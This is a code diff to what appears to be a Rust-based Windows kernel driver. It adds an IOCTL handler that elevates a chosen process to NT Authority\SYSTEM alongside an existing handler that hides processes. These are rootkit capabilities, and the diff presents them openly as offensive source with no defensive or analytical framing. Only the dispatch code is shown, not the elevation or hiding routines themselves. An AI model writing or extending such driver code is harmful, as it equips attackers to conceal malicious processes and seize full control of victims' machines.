@@ -8,12 +8,12 @@ mod utils;
 use utils::ToUnicodeString;
 
 mod process;
-use process::shadow_process;
+use process::{shadow_process, elevate_process};
 
 
 
 mod constants;
-use constants::IOCTL_PROCESS_HIDE_REQUEST;
+use constants::{IOCTL_PROCESS_HIDE_REQUEST, IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST};
 
 
 #[cfg(not(test))]
@@ -23,15 +23,11 @@ use wdk::{nt_success, println};
 use wdk_sys::ntddk::{IoCreateDevice, IoDeleteDevice, IoCreateSymbolicLink, IoDeleteSymbolicLink, IofCompleteRequest};
 use wdk_sys::{
     DRIVER_OBJECT, IRP_MJ_CREATE,IRP_MJ_DEVICE_CONTROL, NTSTATUS, PCUNICODE_STRING, PDEVICE_OBJECT,
-    PIRP, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION, STATUS_UNSUCCESSFUL, IO_NO_INCREMENT, STATUS_INVALID_PARAMETER, STATUS_INSUFFICIENT_RESOURCES
+    PIRP, STATUS_SUCCESS, UNICODE_STRING,PIO_STACK_LOCATION, STATUS_UNSUCCESSFUL, IO_NO_INCREMENT
 };
 
 
-// TEST
 // use wdk_sys::AUX_KLIB::{AuxKlibInitialize, AuxKlibQueryModuleInformation, AUX_MODULE_EXTENDED_INFO};
-use wdk_sys::POOL_FLAG_PAGED;
-//
-
 
 
 
@@ -96,6 +92,7 @@ unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp
     let mut status = STATUS_UNSUCCESSFUL;
 
     match ioctl {
+
         IOCTL_PROCESS_HIDE_REQUEST => {
             let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
             println!("Hiding process PID: {}", target_pid);
@@ -105,7 +102,7 @@ unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp
 
             status = match shadow_process(target_pid) {
                 Ok(true) => {
-                    println!("Process {:?} successfully shadowed", target_pid);
+                    println!("[+] Process {:?} successfully shadowed", target_pid);
                     
                     if !output_buffer.is_null() {
                         *output_buffer = 0x1;
@@ -116,7 +113,7 @@ unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp
                 },
 
                 Ok(false) => {
-                    println!("Unknown error calling shadow_process");
+                    println!("[X] Unknown error calling shadow_process");
 
                     if !output_buffer.is_null() {
                         *output_buffer = 0x0;
@@ -127,7 +124,52 @@ unsafe extern "C" fn major_function_device_control(_device: PDEVICE_OBJECT, pirp
                 }
                 
                 Err(e) => {
-                    println!("Error calling shadow_process: {:?}", e);
+                    println!("[X] Error calling shadow_process: {:?}", e);
+                    
+                    if !output_buffer.is_null() {
+                        *output_buffer = 0x0;
+                        informations = 4;
+                    }
+                    
+                    STATUS_UNSUCCESSFUL
+                },
+            };
+
+            complete_request(pirp, status, informations);
+        },
+
+
+        IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST => {
+            let target_pid = (*stack).Parameters.DeviceIoControl.Type3InputBuffer as u32;
+            println!("[!] Elevating process PID: {} to NT Authority\\SYSTEM ...", target_pid);
+            
+            let output_buffer = (*pirp).UserBuffer as *mut u32;
+            let mut informations = 0;
+
+            status = match elevate_process(target_pid) {
+                Ok(true) => {
+                    
+                    if !output_buffer.is_null() {
+                        *output_buffer = 0x1;
+                        informations = 4;
+                    }
+                    
+                    STATUS_SUCCESS
+                },
+
+                Ok(false) => {
+                    println!("[X] Unknown error calling elevate_process");
+
+                    if !output_buffer.is_null() {
+                        *output_buffer = 0x0;
+                        informations = 4;
+                    }
+
+                    STATUS_UNSUCCESSFUL
+                }
+                
+                Err(e) => {
+                    println!("[X] Error calling elevate_process: {:?}", e);
                     
                     if !output_buffer.is_null() {
                         *output_buffer = 0x0;
